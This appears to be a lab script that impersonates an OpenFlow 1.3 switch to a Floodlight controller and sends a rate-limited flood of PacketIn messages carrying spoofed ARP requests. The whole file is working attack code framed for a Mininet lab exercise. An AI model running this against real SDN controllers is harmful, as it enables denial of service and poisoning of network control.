#!/usr/bin/env python3
"""Discover Floodlight and send a bounded OpenFlow 1.3 PacketIn lab burst.

Run without --send to print the controller target only. The --send mode
emulates one temporary switch connection from the Mininet VM's internal IP.
"""

import argparse
import select
import socket
import struct
import subprocess
import sys
import time


OF_VERSION = 4                  # OpenFlow 1.3
FAKE_DPID = 0xFA00000000000001  # Distinct from Mininet switches s1-s4
NO_BUFFER = 0xFFFFFFFF


def controller_target(bridge="s1"):
    output = subprocess.check_output(
        ["ovs-vsctl", "get-controller", bridge]
    ).decode("utf-8")
    targets = [
        line.strip() for line in output.splitlines()
        if line.strip().startswith("tcp:")
    ]
    if len(targets) != 1:
        raise RuntimeError(
            "Expected one TCP controller for {}. Found: {}".format(bridge, targets)
        )
    _, ip, port = targets[0].split(":", 2)
    return ip, int(port)


def of_message(message_type, xid, body=b""):
    return struct.pack("!BBHI", OF_VERSION, message_type, 8 + len(body), xid) + body


class FrameReader(object):
    """Read complete OpenFlow frames from a TCP stream."""

    def __init__(self, connection):
        self.connection = connection
        self.buffer = bytearray()

    def read(self, timeout):
        deadline = time.monotonic() + timeout
        while True:
            if len(self.buffer) >= 8:
                version, message_type, length, xid = struct.unpack_from(
                    "!BBHI", self.buffer
                )
                if length < 8 or length > 65535:
                    raise RuntimeError("Invalid OpenFlow frame length {}".format(length))
                if len(self.buffer) >= length:
                    body = bytes(self.buffer[8:length])
                    del self.buffer[:length]
                    return version, message_type, xid, body
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise socket.timeout()
            ready, _, _ = select.select([self.connection], [], [], remaining)
            if not ready:
                raise socket.timeout()
            chunk = self.connection.recv(65535)
            if not chunk:
                raise RuntimeError("Controller closed the OpenFlow connection")
            self.buffer.extend(chunk)


def fixed_text(value, size):
    return value.encode("ascii")[:size - 1].ljust(size, b"\0")


def description_body():
    return b"".join([
        fixed_text("Lab 4 PacketIn generator", 256),
        fixed_text("Python OpenFlow 1.3 lab switch", 256),
        fixed_text("Lab 4", 256),
        fixed_text("lab4-packetin", 32),
        fixed_text("Temporary attack connection", 256),
    ])


def port_body():
    mac = b"\x02\xfa\x00\x00\x00\x01"
    return struct.pack(
        "!I4x6s2x16sIIIIIIII", 1, mac, b"attack-port\0\0\0\0\0",
        0, 0, 0, 0, 0, 0, 0, 0,
    )


def complete_handshake(connection, timeout):
    reader = FrameReader(connection)
    connection.sendall(of_message(0, 1))  # OFPT_HELLO
    started = time.monotonic()
    last_reply = started
    got_features = False
    got_port_desc = False
    while time.monotonic() - started < timeout:
        try:
            version, message_type, xid, body = reader.read(0.4)
        except socket.timeout:
            idle = time.monotonic() - last_reply
            if got_features and idle >= 0.8 and (
                    got_port_desc or time.monotonic() - started >= 2.0):
                print("OpenFlow 1.3 handshake completed.", flush=True)
                return
            continue
        if message_type == 0:  # HELLO may advertise a newer version before negotiation
            continue
        if version != OF_VERSION:
            raise RuntimeError("Controller selected OpenFlow version {}".format(version))
        reply = None
        if message_type == 1:  # ERROR
            error_type, error_code = (struct.unpack("!HH", body[:4])
                                      if len(body) >= 4 else (-1, -1))
            raise RuntimeError("Controller OpenFlow error type={} code={}".format(
                error_type, error_code))
        elif message_type == 2:  # ECHO_REQUEST
            reply = of_message(3, xid, body)
        elif message_type == 5:  # FEATURES_REQUEST
            features = struct.pack("!QIBB2xII", FAKE_DPID, 256, 1, 0, 0, 0)
            reply = of_message(6, xid, features)
            got_features = True
        elif message_type == 7:  # GET_CONFIG_REQUEST
            reply = of_message(8, xid, struct.pack("!HH", 0, 0xFFFF))
        elif message_type == 18:  # MULTIPART_REQUEST
            if len(body) < 8:
                raise RuntimeError("Short multipart request")
            subtype = struct.unpack_from("!H", body)[0]
            payload = b""
            if subtype == 0:       # OFPMP_DESC
                payload = description_body()
            elif subtype == 13:    # OFPMP_PORT_DESC
                payload = port_body()
                got_port_desc = True
            multipart = struct.pack("!HH4x", subtype, 0) + payload
            reply = of_message(19, xid, multipart)
        elif message_type == 20:  # BARRIER_REQUEST
            reply = of_message(21, xid)
        elif message_type == 24:  # ROLE_REQUEST
            reply = of_message(25, xid, body)
        elif message_type == 26:  # GET_ASYNC_REQUEST
            reply = of_message(27, xid, b"\0" * 24)
        if reply is not None:
            connection.sendall(reply)
            last_reply = time.monotonic()
    raise RuntimeError("OpenFlow handshake did not complete within {}s".format(timeout))


def packet_in(index):
    """Build one PacketIn containing a valid Ethernet ARP request."""
    source_mac = bytes([2, 0xFA, 0, 0, (index >> 8) & 0xFF, index & 0xFF])
    sender_ip = socket.inet_aton("10.250.{}.{}".format(
        (index // 250) % 250, (index % 250) + 1))
    target_ip = socket.inet_aton("10.0.0.1")
    arp = (struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + source_mac +
           sender_ip + b"\0" * 6 + target_ip)
    ethernet = b"\xff" * 6 + source_mac + b"\x08\x06" + arp
    ethernet = ethernet.ljust(60, b"\0")
    # OFPMT_OXM match: OXM_OF_IN_PORT=1, padded to an eight-byte boundary.
    match = (struct.pack("!HH", 1, 12) +
             struct.pack("!HBBI", 0x8000, 0, 4, 1) + b"\0" * 4)
    body = (struct.pack("!IHBBQ", NO_BUFFER, len(ethernet), 0, 0, 0) +
            match + b"\0\0" + ethernet)
    return of_message(10, 0x1000 + index, body)  # OFPT_PACKET_IN


def send_burst(ip, port, source_port, count, rate, handshake_timeout):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        connection.bind(("0.0.0.0", source_port))
        connection.settimeout(3.0)
        connection.connect((ip, port))
        source_ip, actual_port = connection.getsockname()
        print("Source {}:{} -> controller {}:{}".format(
            source_ip, actual_port, ip, port), flush=True)
        complete_handshake(connection, handshake_timeout)
        print("Sending {} PacketIn messages at {:.1f}/s.".format(
            count, rate), flush=True)
        start = time.monotonic()
        for index in range(count):
            delay = start + index / rate - time.monotonic()
            if delay > 0:
                time.sleep(delay)
            connection.sendall(packet_in(index))
            if (index + 1) % 50 == 0 or index + 1 == count:
                print("Sent {}/{} PacketIns".format(index + 1, count), flush=True)
        time.sleep(0.3)
        print("Burst complete from source port {}.".format(source_port), flush=True)
    finally:
        connection.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--bridge", default="s1", help="OVS bridge to inspect")
    parser.add_argument("--send", action="store_true", help="send a bounded PacketIn burst")
    parser.add_argument("--source-port", type=int, default=41000)
    parser.add_argument("--count", type=int, default=400)
    parser.add_argument("--rate", type=float, default=250.0, help="PacketIns per second")
    parser.add_argument("--handshake-timeout", type=float, default=8.0)
    args = parser.parse_args()
    if not 1024 <= args.source_port <= 65535:
        parser.error("source port must be 1024-65535")
    if not 1 <= args.count <= 10000 or not 1 <= args.rate <= 2000:
        parser.error("count must be 1-10000 and rate must be 1-2000")
    if args.handshake_timeout <= 0:
        parser.error("handshake timeout must be positive")
    try:
        ip, port = controller_target(args.bridge)
        print("Detected controller: {}:{}".format(ip, port), flush=True)
        if args.send:
            send_burst(ip, port, args.source_port, args.count,
                       args.rate, args.handshake_timeout)
    except (OSError, RuntimeError, subprocess.CalledProcessError) as exc:
        sys.exit("ERROR: {}".format(exc))


if __name__ == "__main__":
    main()
